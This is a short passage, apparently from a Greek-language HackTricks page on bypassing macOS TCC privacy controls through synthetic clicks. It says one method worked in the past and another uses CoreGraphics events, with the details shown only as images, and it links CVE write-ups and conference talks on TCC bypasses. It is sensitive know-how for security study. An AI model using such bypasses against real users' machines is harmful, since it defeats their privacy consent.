<figure><img src="../../../../../images/image (474).png" alt=""><figcaption></figcaption></figure>

## Synthetic Clicks

Αυτό δεν λειτουργεί πλέον, αλλά [**did in the past**](https://twitter.com/noarfromspace/status/639125916233416704/photo/1)**:**

<figure><img src="../../../../../images/image (29).png" alt=""><figcaption></figcaption></figure>

Ένας άλλος τρόπος με χρήση [**CoreGraphics events**](https://objectivebythesea.org/v2/talks/OBTS_v2_Wardle.pdf):

<figure><img src="../../../../../images/image (30).png" alt="" width="563"><figcaption></figcaption></figure>

## Αναφορές

- [**https://medium.com/@mattshockl/cve-2020-9934-bypassing-the-os-x-transparency-consent-and-control-tcc-framework-for-4e14806f1de8**](https://medium.com/@mattshockl/cve-2020-9934-bypassing-the-os-x-transparency-consent-and-control-tcc-framework-for-4e14806f1de8)
- [**https://www.sentinelone.com/labs/bypassing-macos-tcc-user-privacy-protections-by-accident-and-design/**](https://www.sentinelone.com/labs/bypassing-macos-tcc-user-privacy-protections-by-accident-and-design/)
- [**20+ Ways to Bypass Your macOS Privacy Mechanisms**](https://www.youtube.com/watch?v=W9GxnP8c8FU)
- [**Knockout Win Against TCC - 20+ NEW Ways to Bypass Your MacOS Privacy Mechanisms**](https://www.youtube.com/watch?v=a9hsxPdRxsY)

{{#include ../../../../../banners/hacktricks-training.md}}
